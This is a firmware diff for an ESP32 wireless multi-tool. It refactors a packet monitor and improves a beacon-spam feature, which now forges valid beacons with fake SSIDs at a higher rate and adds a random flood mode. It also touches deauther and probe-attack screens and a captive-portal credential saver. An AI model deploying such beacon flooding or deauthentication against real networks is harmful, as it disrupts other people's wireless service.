@@ -12,6 +12,11 @@
 #include "shared.h"
 #include "utils.h"
 
+extern "C" {
+#include "lwip/etharp.h"
+#include "lwip/netif.h"
+}
+
 /** Active-scan dwell per channel for STA scans (Arduino default 300 ms; shared.h WIFI_SCAN_ACTIVE_MS). */
 static inline uint32_t wifiStaScanMsPerChannel() {
   return (uint32_t)constrain((long)WIFI_SCAN_ACTIVE_MS, 120L, 1500L);
@@ -82,7 +87,7 @@ static constexpr uint16_t kPtmToolbarBg = 0x4208;
 static bool s_ptmHwReady = false;
 
 #define MAX_CH 14
-#define SNAP_LEN 2324
+#define SNAP_LEN ESP32DIV_PCAP_SNAP_LEN
 
 static constexpr uint32_t PCAP_MAGIC_USEC = 0xa1b2c3d4;
 static constexpr uint16_t PCAP_VER_MAJOR = 2;
@@ -139,52 +144,29 @@ static uint32_t pcapPacketsWritten = 0;
 static uint32_t pcapDropped = 0;
 static uint32_t pcapLastFlushMs = 0;
 
-static constexpr uint8_t PCAP_POOL_SIZE = 10;
+static constexpr uint8_t PCAP_POOL_SIZE = ESP32DIV_PCAP_POOL_SIZE;
 struct PcapSlot {
   PcapRecordHeader hdr;
   uint16_t caplen;
   uint8_t  data[SNAP_LEN + RADIOTAP_LEN];
 };
-static PcapSlot pcapPool[PCAP_POOL_SIZE];
+#if BOARD_HAS_ESP32S3
+static PcapSlot pcapPoolStorage[PCAP_POOL_SIZE];
+static PcapSlot* pcapPool = pcapPoolStorage;
+#else
+// Classic ESP32: keep ~1.6KB+ out of .bss; allocate only when PCAP logging starts.
+static PcapSlot* pcapPool = nullptr;
+#endif
 static QueueHandle_t pcapFreeQ = nullptr;
 static QueueHandle_t pcapWriteQ = nullptr;
 
 static bool pcapMountSD() {
   if (pcapMounted) {
-    if (SD.exists("/")) return true;
+    if (SD.cardType() != CARD_NONE) return true;
     pcapMounted = false;
   }
-
-  #ifdef SD_CD
-  pinMode(SD_CD, INPUT_PULLUP);
-  if (digitalRead(SD_CD)) return false;
-  #endif
-
-  #ifdef SD_SCLK
-  #ifdef SD_MISO
-  #ifdef SD_MOSI
-  #ifdef SD_CS
-  SPI.begin(SD_SCLK, SD_MISO, SD_MOSI, SD_CS);
-  #endif
-  #endif
-  #endif
-  #endif
-
-  #ifdef SD_CS
-  if (SD.begin(SD_CS)) { pcapMounted = true; return true; }
-  #endif
-
-  #ifdef SD_CS_PIN
-  #ifdef CC1101_CS
-  if (SD_CS_PIN != CC1101_CS) {
-    if (SD.begin(SD_CS_PIN)) { pcapMounted = true; return true; }
-  }
-  #else
-  if (SD.begin(SD_CS_PIN)) { pcapMounted = true; return true; }
-  #endif
-  #endif
-
-  return false;
+  pcapMounted = isSDCardAvailable();
+  return pcapMounted;
 }
 
 static bool pcapEnsureDir(const char* dirPath) {
@@ -264,6 +246,16 @@ static void pcapStart() {
     return;
   }
 
+#if !BOARD_HAS_ESP32S3
+  if (!pcapPool) {
+    pcapPool = (PcapSlot*)malloc(sizeof(PcapSlot) * PCAP_POOL_SIZE);
+    if (!pcapPool) {
+      pcapStop();
+      return;
+    }
+  }
+#endif
+
   for (uint8_t i = 0; i < PCAP_POOL_SIZE; i++) {
     xQueueSend(pcapFreeQ, &i, 0);
   }
@@ -291,13 +283,35 @@ static void ptmStartRadioAndPcapOnce() {
   if (gm == ESP_ERR_WIFI_NOT_INIT) {
     tcpip_adapter_init();
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
-    ESP_ERROR_CHECK(esp_wifi_start());
+    esp_err_t err = esp_wifi_init(&cfg);
+    if (err != ESP_OK) {
+      Serial.printf("[ptm] wifi_init failed: %s\n", esp_err_to_name(err));
+      return;
+    }
+    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    if (err != ESP_OK) {
+      Serial.printf("[ptm] set_storage failed: %s\n", esp_err_to_name(err));
+      return;
+    }
+    err = esp_wifi_set_mode(WIFI_MODE_NULL);
+    if (err != ESP_OK) {
+      Serial.printf("[ptm] set_mode failed: %s\n", esp_err_to_name(err));
+      return;
+    }
+    err = esp_wifi_start();
+    if (err != ESP_OK) {
+      Serial.printf("[ptm] wifi_start failed: %s\n", esp_err_to_name(err));
+      return;
+    }
+  } else if (gm != ESP_OK) {
+    Serial.printf("[ptm] get_mode failed: %s\n", esp_err_to_name(gm));
+    return;
   } else {
-    ESP_ERROR_CHECK(gm);
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
+    const esp_err_t sm = esp_wifi_set_mode(WIFI_MODE_NULL);
+    if (sm != ESP_OK) {
+      Serial.printf("[ptm] set_mode failed: %s\n", esp_err_to_name(sm));
+      return;
+    }
   }
 
   pcapStart();
@@ -323,7 +337,7 @@ static uint16_t pcapChannelFlags(uint16_t freqMHz) {
   return 0;
 }
 
-#define MAX_X 240
+#define MAX_X ESP32DIV_PKT_GRAPH_WIDTH
 #define MAX_Y 320
 
 arduinoFFT FFT = arduinoFFT();
@@ -333,7 +347,7 @@ bool btnRightPressed = false;
 
 Preferences preferences;
 
-const uint16_t samples = 256;
+const uint16_t samples = ESP32DIV_FFT_SAMPLES;
 const double samplingFrequency = 5000;
 
 double attenuation = 10;
@@ -344,7 +358,8 @@ unsigned long microseconds;
 double vReal[samples];
 double vImag[samples];
 
-byte palette_red[128], palette_green[128], palette_blue[128];
+byte palette_red[ESP32DIV_FFT_PALETTE_SIZE], palette_green[ESP32DIV_FFT_PALETTE_SIZE],
+     palette_blue[ESP32DIV_FFT_PALETTE_SIZE];
 
 bool buttonPressed = false;
 bool buttonEnabled = true;
@@ -386,6 +401,7 @@ void do_sampling_FFT() {
   FFT.Compute(vReal, vImag, samples, FFT_FORWARD);
   FFT.ComplexToMagnitude(vReal, vImag, samples);
 
+  // Original layout: mirrored waterfall centered at x=120 (full ~240px width with 256-pt FFT).
   unsigned int left_x = 120;
   unsigned int graph_y_offset = 91;
   int max_k = 0;
@@ -443,9 +459,12 @@ void do_sampling_FFT() {
   }
 
   unsigned int area_graph_width = (samples >> 1);
-  unsigned int area_graph_x_offset_flipped = -7;
+  int area_graph_x_offset_flipped = (int)left_x - (int)area_graph_width;
+  if (area_graph_x_offset_flipped < 0) {
+    area_graph_x_offset_flipped = 0;
+  }
 
-  tft.fillRect(area_graph_x_offset_flipped, area_graph_y_offset, area_graph_width, area_graph_height, TFT_BLACK);
+  tft.fillRect((unsigned)area_graph_x_offset_flipped, area_graph_y_offset, area_graph_width, area_graph_height, TFT_BLACK);
 
   for (int j = 0; j < samples >> 1; j++) {
     int k = vReal[j] / attenuation;
@@ -455,7 +474,7 @@ void do_sampling_FFT() {
     int current_y = area_graph_height
               - (int)::map(k, 0, 127, 0, area_graph_height)
               + area_graph_y_offset;
-    unsigned int x = area_graph_x_offset_flipped + area_graph_width - j - 1;
+    unsigned int x = (unsigned)area_graph_x_offset_flipped + area_graph_width - j - 1;
 
     if (j > 0) {
       tft.fillTriangle(x + 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x + 1, last_y[j - 1], color);
@@ -512,7 +531,7 @@ void wifi_promiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
   tmpPacketCounter++;
   rssiSum += ctrl.rssi;
 
-  if (!pcapEnabled || !pcapFile || !pcapFreeQ || !pcapWriteQ) return;
+  if (!pcapEnabled || !pcapFile || !pcapFreeQ || !pcapWriteQ || !pcapPool) return;
 
   uint8_t slotIdx;
   if (xQueueReceive(pcapFreeQ, &slotIdx, 0) != pdTRUE) {
@@ -762,6 +781,7 @@ void ptmSetup() {
     palette_green[i] = 0;
     palette_blue[i] = 63 - i;
   }
+#if ESP32DIV_FFT_PALETTE_SIZE > 64
   for (int i = 64; i < 96; i++) {
     palette_red[i] = 31;
     palette_green[i] = (i - 64) * 2;
@@ -772,6 +792,7 @@ void ptmSetup() {
     palette_green[i] = 63;
     palette_blue[i] = i - 96;
   }
+#endif
 
   preferences.begin("packetmonitor32", false);
   ch = preferences.getUInt("channel", 1);
@@ -887,7 +908,7 @@ void ptmLoop() {
     btnRightPressed = false;
   }
 
-  pkts[127] = tmpPacketCounter;
+  pkts[MAX_X - 1] = tmpPacketCounter;
 
   tmpPacketCounter = 0;
   deauths = 0;
@@ -900,8 +921,9 @@ namespace BeaconSpammer {
 bool btnLeftPress;
 bool btnRightPress;
 bool btnSelectPress;
+bool btnDownPress;
 
-String ssidList[] = {
+static const char* ssidList[] = {
   "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
   "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
   "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
@@ -914,13 +936,16 @@ String ssidList[] = {
   "Meme_LANd"
 };
 
-const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);
+static const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);
 
 uint8_t spamchannel = 1;
 bool    spam        = false;
 int     y_offset    = 20;
 
 static constexpr int kSpamBodyTop = 37;
+static constexpr int kMaxChannel = 13;
+static uint8_t s_ssidIdx = 0;
+static uint8_t s_beaconPkt[128];
 
 static bool spamYFits(int y, int h = 10) {
   return y + h <= wifiContentBottom();
@@ -958,7 +983,7 @@ static void spamUpdateNavLabels() {
   if (!featureHasTouchNavBar()) {
     return;
   }
-  setTouchNavLabels("Ch-", nullptr, "Exit", spam ? "Stop" : "Start", "Ch+");
+  setTouchNavLabels("Ch-", "Flood", "Exit", spam ? "Stop" : "Start", "Ch+");
   redrawTouchButtonBar();
 }
 
@@ -988,26 +1013,65 @@ static void spamDrawToolbarStatus() {
 static uint8_t lastSpamChannel = 0xFF;
 static bool    lastSpamState   = !false;
 
-uint8_t packet[128] = {0x80, 0x00, 0x00, 0x00,
-                       0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
-                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
-                       0xc0, 0x6c,
-                       0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
-                       0x64, 0x00,
-                       0x01, 0x04,
-                       0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
-                       0x01, 0x08, 0x82, 0x84,
-                       0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
-                       0x04
-                      };
+// Build a valid beacon with variable SSID length. The old fixed 57-byte template
+// assumed SSID len == 6, so longer names overwrote rates/channel and clients
+// dropped most frames (only a few APs appeared).
+static uint16_t buildSpamBeacon(const char* ssid, uint8_t channel, uint8_t* out,
+                                uint16_t outMax, const uint8_t mac[6]) {
+  if (!ssid || !out || !mac || outMax < 64) {
+    return 0;
+  }
+  const uint8_t ssidLen = (uint8_t)min((size_t)32, strlen(ssid));
+  const uint16_t need = (uint16_t)(24 + 12 + 2 + ssidLen + 10 + 3);
+  if (need > outMax) {
+    return 0;
+  }
+
+  uint16_t pos = 0;
+  out[pos++] = 0x80;  // Beacon
+  out[pos++] = 0x00;
+  out[pos++] = 0x00;
+  out[pos++] = 0x00;
+  memset(&out[pos], 0xFF, 6);  // DA broadcast
+  pos += 6;
+  memcpy(&out[pos], mac, 6);   // SA
+  pos += 6;
+  memcpy(&out[pos], mac, 6);   // BSSID
+  pos += 6;
+  out[pos++] = 0xc0;  // seq/frag
+  out[pos++] = 0x6c;
+
+  // Fixed params: timestamp + beacon interval + capability
+  memset(&out[pos], 0, 8);
+  pos += 8;
+  out[pos++] = 0x64;  // interval 100 TU
+  out[pos++] = 0x00;
+  out[pos++] = 0x01;  // ESS
+  out[pos++] = 0x04;
+
+  out[pos++] = 0x00;  // SSID IE
+  out[pos++] = ssidLen;
+  memcpy(&out[pos], ssid, ssidLen);
+  pos += ssidLen;
+
+  static const uint8_t rates[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c
+  };
+  memcpy(&out[pos], rates, sizeof(rates));
+  pos += sizeof(rates);
+
+  out[pos++] = 0x03;  // DS Parameter Set
+  out[pos++] = 0x01;
+  out[pos++] = channel;
+  return pos;
+}
 
 void handleLeftButton() {
-  spamchannel = (spamchannel == 1) ? 14 : spamchannel - 1;
+  spamchannel = (spamchannel <= 1) ? kMaxChannel : (uint8_t)(spamchannel - 1);
 }
 
 void handleRightButton() {
-  spamchannel = (spamchannel == 14) ? 1 : spamchannel + 1;
+  spamchannel = (spamchannel >= kMaxChannel) ? 1 : (uint8_t)(spamchannel + 1);
 }
 
 void handleSelectButton() {
@@ -1034,7 +1098,7 @@ void output() {
     if (spamYFits(30 + y_offset, 10)) {
       tft.print(".");
     }
-    delay(random(1000));
+    delay(random(200, 400));
   }
 
   {
@@ -1049,76 +1113,66 @@ void output() {
       tft.print(")");
     }
   }
-  delay(random(500));
+  delay(200);
 
-  printLine(70 + y_offset, UI_WARN, "[!] SSID generated successfully");
-  delay(random(500));
+  printLine(70 + y_offset, UI_WARN, "[!] SSID list ready");
+  delay(150);
 
-  printLine(80 + y_offset, UI_WARN, "[!] Setting random SRC MAC");
-  delay(random(500));
+  printLine(80 + y_offset, UI_WARN, "[!] Cycling all SSIDs");
+  delay(150);
 
   printLine(110 + y_offset, UI_TEXT, "[*] Starting broadcast");
-  delay(random(500));
+  delay(150);
 
-  const int maxLines = min(18, spamMaxListLines());
+  const int maxLines = min(ssidCount, min(18, spamMaxListLines()));
   for (int i = 0; i < maxLines; i++) {
     const int y = 130 + i * 10 + y_offset;
     if (!spamYFits(y, 10)) {
       break;
     }
-    String randomSSID = ssidList[random(ssidCount)];
     tft.setTextColor(WHITE, TFT_BLACK);
     tft.setCursor(2, y);
     tft.print("[+] ");
-    tft.print(randomSSID);
-    delay(random(500));
+    tft.print(ssidList[i]);
+    delay(40);
   }
 
   maintainTouchNavBar();
 }
 
 void spammer() {
+  if (spamchannel < 1 || spamchannel > kMaxChannel) {
+    spamchannel = 1;
+  }
+
+  const int idx = s_ssidIdx % ssidCount;
+  s_ssidIdx = (uint8_t)((s_ssidIdx + 1) % ssidCount);
+  const char* ssid = ssidList[idx];
+
+  // Stable locally-administered MAC per SSID index so phones keep distinct APs.
+  uint8_t mac[6] = {
+    0x02,
+    0xDE,
+    0xAD,
+    (uint8_t)(0x10 + (idx % 200)),
+    (uint8_t)(0x20 + ((idx * 3) % 200)),
+    (uint8_t)(0x30 + ((idx * 7) % 200))
+  };
+
+  const uint16_t len = buildSpamBeacon(ssid, spamchannel, s_beaconPkt, sizeof(s_beaconPkt), mac);
+  if (len == 0) {
+    return;
+  }
+
   esp_wifi_set_channel(spamchannel, WIFI_SECOND_CHAN_NONE);
-
-  for (int i = 10; i <= 21; i++) {
-    packet[i] = random(256);
+  // Burst a few copies so scanners catch each SSID reliably.
+  for (int n = 0; n < 3; n++) {
+    (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
   }
-
-  String randomSSID = ssidList[random(ssidCount)];
-  int ssidLength = randomSSID.length();
-  packet[37] = ssidLength;
-
-  for (int i = 0; i < ssidLength; i++) {
-    packet[38 + i] = randomSSID[i];
-  }
-
-  for (int i = 38 + ssidLength; i <= 43; i++) {
-    packet[i] = 0x00;
-  }
-
-  packet[56] = spamchannel;
-
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
-
-  delay(1);
 }
 
 void beaconSpam() {
-    String ssid = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
-    byte channel;
-
-    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00,
-                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
-                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
-                            0xc0, 0x6c,
-                            0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
-                            0x64, 0x00,
-                            0x01, 0x04,
-                            0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
-                            0x01, 0x08, 0x82, 0x84,
-                            0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
-                            0x04};
+    uint8_t channel;
 
     tft.setTextFont(1);
     tft.setTextSize(1);
@@ -1126,7 +1180,7 @@ void beaconSpam() {
     if (spamYFits(30 + y_offset, 10)) {
       tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(2, 30 + y_offset);
-      tft.print("[!!] FUCK IT");
+      tft.print("[!!] Random flood mode");
     }
     if (spamYFits(50 + y_offset, 10)) {
       tft.setTextColor(UI_TEXT, TFT_BLACK);
@@ -1135,7 +1189,7 @@ void beaconSpam() {
     }
     maintainTouchNavBar();
 
-    delay(500);
+    delay(300);
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_err_t err = esp_wifi_init(&cfg);
@@ -1168,38 +1222,28 @@ void beaconSpam() {
         return;
     }
 
+    uint8_t floodIdx = 0;
     while (true) {
-        channel = random(1, 13);
+        channel = (uint8_t)random(1, kMaxChannel + 1);
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-        for (int i = 10; i <= 15; i++) {
-            packet[i] = random(256);
-        }
-        for (int i = 16; i <= 21; i++) {
-            packet[i] = random(256);
-        }
+        const char* ssid = ssidList[floodIdx % ssidCount];
+        floodIdx++;
 
-        packet[38] = ssid[random(65)];
-        packet[39] = ssid[random(65)];
-        packet[40] = ssid[random(65)];
-        packet[41] = ssid[random(65)];
-        packet[42] = ssid[random(65)];
-        packet[43] = ssid[random(65)];
+        uint8_t mac[6] = {
+          0x02,
+          (uint8_t)random(256),
+          (uint8_t)random(256),
+          (uint8_t)random(256),
+          (uint8_t)random(256),
+          (uint8_t)random(256)
+        };
 
-        packet[56] = channel;
-
-        esp_err_t result;
-        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
-        if (result != ESP_OK) {
-            Serial.printf("Packet 1 send failed: %d\n", result);
-        }
-        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
-        if (result != ESP_OK) {
-            Serial.printf("Packet 2 send failed: %d\n", result);
-        }
-        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
-        if (result != ESP_OK) {
-            Serial.printf("Packet 3 send failed: %d\n", result);
+        const uint16_t len = buildSpamBeacon(ssid, channel, s_beaconPkt, sizeof(s_beaconPkt), mac);
+        if (len > 0) {
+          (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
+          (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
+          (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
         }
 
         delay(1);
@@ -1292,7 +1336,7 @@ void runUI() {
 
     case 4:
       if (spam) {
-        if (millis() - lastSpamTime >= 50) {
+        if (millis() - lastSpamTime >= 10) {
           spammer();
           lastSpamTime = millis();
         }
@@ -1337,6 +1381,10 @@ void beaconSpamSetup() {
   pauseBackgroundRadioTasks();
   setTouchButtonInputEnabled(true);
   spam = false;
+  s_ssidIdx = 0;
+  if (spamchannel < 1 || spamchannel > kMaxChannel) {
+    spamchannel = 1;
+  }
   spamUpdateNavLabels();
   featureClearContent(TFT_BLACK);
 
@@ -1369,6 +1417,9 @@ void beaconSpamSetup() {
   err = esp_wifi_start();
   if (err != ESP_OK) Serial.printf("WiFi start failed: %d\n", err);
 
+  // Hidden SoftAP so WIFI_IF_AP raw TX is reliable.
+  WiFi.softAP(".", nullptr, spamchannel, 1, 4);
+
   err = esp_wifi_set_promiscuous(true);
   if (err != ESP_OK) Serial.printf("Promiscuous set failed: %d\n", err);
 
@@ -1398,6 +1449,7 @@ void beaconSpamLoop() {
   btnLeftPress = isButtonPressed(BTN_LEFT);
   btnRightPress = isButtonPressed(BTN_RIGHT);
   btnSelectPress = isButtonPressed(BTN_UP);
+  btnDownPress = isButtonPressed(BTN_DOWN);
 
   delay(10);
 
@@ -1409,45 +1461,54 @@ void beaconSpamLoop() {
     handleRightButton();
     delay(200);
   }
+  if (btnDownPress) {
+    // Random flood mode (same as toolbar nuke).
+    spam = false;
+    lastSpamState = false;
+    spamDrawToolbarStatus();
+    spamUpdateNavLabels();
+    beaconSpam();
+    // Wait for Select release so exiting flood doesn't exit the feature.
+    while (isButtonPressed(BTN_SELECT)) {
+      delay(10);
+    }
+    delay(150);
+    spamClearBody();
+    spamDrawIdleHint();
+    spamUpdateNavLabels();
+    spamDrawToolbarStatus();
+  }
   if (btnSelectPress) {
+    const bool wasRunning = spam;
     handleSelectButton();
     delay(200);
+    if (!wasRunning && spam) {
+      spamClearBody();
+      output();
+      spamUpdateNavLabels();
+    } else if (wasRunning && !spam) {
+      spamClearBody();
+      spamDrawIdleHint();
+      spamUpdateNavLabels();
+    }
   }
 
   if (lastSpamChannel != spamchannel || lastSpamState != spam) {
     spamDrawToolbarStatus();
-
     if (lastSpamState != spam) {
       spamUpdateNavLabels();
-      if (lastSpamState && !spam) {
-        spamClearBody();
-        spamDrawIdleHint();
-      } else if (!lastSpamState && spam) {
-        spamClearBody();
-      }
     }
-
     lastSpamChannel = spamchannel;
     lastSpamState   = spam;
   }
 
-  while (spam) {
-    runUI();
+  // Keep transmitting while enabled — do not require holding UP.
+  if (spam) {
     if (feature_exit_requested || featureExitButtonPressed()) {
       spam = false;
-      break;
+      return;
     }
-
     spammer();
-
-    if (btnSelectPress) {
-      output();
-    }
-
-    if (!isButtonPressed(BTN_UP)) {
-      delay(50);
-      break;
-    }
   }
 }
 }
@@ -1461,7 +1522,7 @@ static int deauthVisibleLines() {
   return min(DEAUTH_TERM_CAPACITY, wifiMaxLinesInZone(45, LINE_HEIGHT));
 }
 
-#define MAX_NETWORKS 50
+#define MAX_NETWORKS ESP32DIV_MAX_WIFI_NETWORKS
 #define MAX_CHANNELS 14
 #define MAX_SSID_LENGTH 8
 
@@ -2869,27 +2930,12 @@ void saveCredential(String username, String password, String ssid) {
 static bool cp_sd_mounted = false;
 
 static bool cpMountSD() {
-
   if (cp_sd_mounted) {
-    if (SD.exists("/")) return true;
+    if (SD.cardType() != CARD_NONE) return true;
     cp_sd_mounted = false;
   }
-
-  bool ok = false;
-  #ifdef SD_CS
-  ok = SD.begin(SD_CS);
-  #endif
-  #ifdef SD_CS_PIN
-  if (!ok) {
-    #ifdef CC1101_CS
-    if (SD_CS_PIN != CC1101_CS) ok = SD.begin(SD_CS_PIN);
-    #else
-    ok = SD.begin(SD_CS_PIN);
-    #endif
-  }
-  #endif
-  cp_sd_mounted = ok;
-  return ok;
+  cp_sd_mounted = isSDCardAvailable();
+  return cp_sd_mounted;
 }
 
 static bool cpEnsureDir(const char* dirPath) {
@@ -4475,27 +4521,31 @@ void drawAttackScreen() {
 static void deautherHandleNavButtons() {
     const unsigned long now = millis();
     if (now - deautherLastButtonPress < deautherDebounceTime) {
+        // Keep edge state in sync while debounce is active so a held press
+        // cannot fire again as soon as the window expires.
+        (void)isButtonPressedEdge(BTN_LEFT);
+        (void)isButtonPressedEdge(BTN_RIGHT);
+        (void)isButtonPressedEdge(BTN_UP);
+        (void)isButtonPressedEdge(BTN_DOWN);
         return;
     }
 
     if (selected_ap_index >= 0) {
-        if (isButtonPressed(BTN_LEFT)) {
+        if (isButtonPressedEdge(BTN_LEFT)) {
             attack_running = !attack_running;
             if (!attack_running) {
                 last_packet_time = 0;
             }
             drawAttackScreen();
             deautherLastButtonPress = now;
-            delay(200);
             return;
         }
-        if (isButtonPressed(BTN_RIGHT)) {
+        if (isButtonPressedEdge(BTN_RIGHT)) {
             attack_running = false;
             last_packet_time = 0;
             selected_ap_index = -1;
             drawScanScreen();
             deautherLastButtonPress = now;
-            delay(200);
             return;
         }
         return;
@@ -4505,32 +4555,28 @@ static void deautherHandleNavButtons() {
         return;
     }
 
-    if (isButtonPressed(BTN_LEFT)) {
+    if (isButtonPressedEdge(BTN_LEFT)) {
         if (scanNetworks()) {
             drawScanScreen();
         }
         deautherLastButtonPress = now;
-        delay(200);
         return;
     }
-    if (isButtonPressed(BTN_UP) && currentIndex > 0) {
+    if (isButtonPressedEdge(BTN_UP) && currentIndex > 0) {
         currentIndex--;
         drawScanScreen();
         deautherLastButtonPress = now;
-        delay(200);
         return;
     }
-    if (isButtonPressed(BTN_DOWN) && currentIndex < network_count - 1) {
+    if (isButtonPressedEdge(BTN_DOWN) && currentIndex < network_count - 1) {
         currentIndex++;
         drawScanScreen();
         deautherLastButtonPress = now;
-        delay(200);
         return;
     }
-    if (isButtonPressed(BTN_RIGHT) && network_count > 0) {
+    if (isButtonPressedEdge(BTN_RIGHT) && network_count > 0) {
         deautherOpenTarget(currentIndex);
         deautherLastButtonPress = now;
-        delay(200);
     }
 }
 
@@ -4539,6 +4585,12 @@ void handleTouch() {
     int x, y;
     if (!readTouchXY(x, y)) return;
 
+    static unsigned long lastTouchActionMs = 0;
+    const unsigned long now = millis();
+    if (now - lastTouchActionMs < 300) {
+        return;
+    }
+
     bool redraw = false;
     if (selected_ap_index == -1) {
         const int listMaxY = LIST_FIRST_ROW_Y + (deautherNetworksPerPage() * LIST_ROW_H);
@@ -4546,27 +4598,27 @@ void handleTouch() {
             int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * deautherNetworksPerPage());
             if (index >= 0 && index < network_count) {
                 deautherOpenTarget(index);
-                delay(50);
+                lastTouchActionMs = now;
             }
         } else if (!featureHasTouchNavBar() && !scanning && y >= 290 && y <= 320) {
             if (x >= 0 && x <= 57) {
                 drawButton(0, 304, 57, 16, "Rescan", true, false);
-                delay(50);
                 if (scanNetworks()) {
                     drawScanScreen();
                 }
+                lastTouchActionMs = now;
                 redraw = true;
             } else if (x >= 122 && x <= 179 && currentIndex > 0) {
                 drawButton(117, 304, 57, 16, "Prev", true, false);
                 currentIndex--;
                 drawScanScreen();
-                delay(50);
+                lastTouchActionMs = now;
                 redraw = true;
             } else if (x >= 183 && x <= 240 && currentIndex < network_count - 1) {
                 drawButton(178, 304, 57, 16, "Next", true, false);
                 currentIndex++;
                 drawScanScreen();
-                delay(50);
+                lastTouchActionMs = now;
                 redraw = true;
             }
         }
@@ -4579,7 +4631,7 @@ void handleTouch() {
                     last_packet_time = 0;
                 }
                 drawAttackScreen();
-                delay(50);
+                lastTouchActionMs = now;
                 redraw = true;
             } else if (x >= 183 && x <= 240) {
                 drawButton(177, 304, 57, 16, "Back", true, false);
@@ -4587,14 +4639,14 @@ void handleTouch() {
                 last_packet_time = 0;
                 selected_ap_index = -1;
                 drawScanScreen();
-                delay(50);
+                lastTouchActionMs = now;
                 redraw = true;
             }
         }
     }
 
     if (redraw) {
-        delay(100);
+        delay(50);
     }
 }
 
@@ -5159,27 +5211,31 @@ void drawAttackScreen() {
 static void probeHandleNavButtons() {
     const unsigned long now = millis();
     if (now - probeLastButtonPress < probeDebounceTime) {
+        // Keep edge state in sync while debounce is active so a held press
+        // cannot fire again as soon as the window expires.
+        (void)isButtonPressedEdge(BTN_LEFT);
+        (void)isButtonPressedEdge(BTN_RIGHT);
+        (void)isButtonPressedEdge(BTN_UP);
+        (void)isButtonPressedEdge(BTN_DOWN);
         return;
     }
 
     if (selected_ap_index >= 0) {
-        if (isButtonPressed(BTN_LEFT)) {
+        if (isButtonPressedEdge(BTN_LEFT)) {
             attack_running = !attack_running;
             if (!attack_running) {
                 last_packet_time = 0;
             }
             drawAttackScreen();
             probeLastButtonPress = now;
-            delay(200);
             return;
         }
-        if (isButtonPressed(BTN_RIGHT)) {
+        if (isButtonPressedEdge(BTN_RIGHT)) {
             attack_running = false;
             last_packet_time = 0;
             selected_ap_index = -1;
             drawScanScreen();
             probeLastButtonPress = now;
-            delay(200);
             return;
         }
         return;
@@ -5189,32 +5245,28 @@ static void probeHandleNavButtons() {
         return;
     }
 
-    if (isButtonPressed(BTN_LEFT)) {
+    if (isButtonPressedEdge(BTN_LEFT)) {
         if (scanNetworks()) {
             drawScanScreen();
         }
         probeLastButtonPress = now;
-        delay(200);
         return;
     }
-    if (isButtonPressed(BTN_UP) && currentIndex > 0) {
+    if (isButtonPressedEdge(BTN_UP) && currentIndex > 0) {
         currentIndex--;
         drawScanScreen();
         probeLastButtonPress = now;
-        delay(200);
         return;
     }
-    if (isButtonPressed(BTN_DOWN) && currentIndex < network_count - 1) {
+    if (isButtonPressedEdge(BTN_DOWN) && currentIndex < network_count - 1) {
         currentIndex++;
         drawScanScreen();
         probeLastButtonPress = now;
-        delay(200);
         return;
     }
-    if (isButtonPressed(BTN_RIGHT) && network_count > 0) {
+    if (isButtonPressedEdge(BTN_RIGHT) && network_count > 0) {
         probeOpenTarget(currentIndex);
         probeLastButtonPress = now;
-        delay(200);
     }
 }
 
@@ -5223,6 +5275,12 @@ void handleTouch() {
     int x, y;
     if (!readTouchXY(x, y)) return;
 
+    static unsigned long lastTouchActionMs = 0;
+    const unsigned long now = millis();
+    if (now - lastTouchActionMs < 300) {
+        return;
+    }
+
     bool redraw = false;
     if (selected_ap_index == -1) {
         const int listMaxY = LIST_FIRST_ROW_Y + (probeNetworksPerPage() * LIST_ROW_H);
@@ -5230,27 +5288,27 @@ void handleTouch() {
             int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * probeNetworksPerPage());
             if (index >= 0 && index < network_count) {
                 probeOpenTarget(index);
-                delay(50);
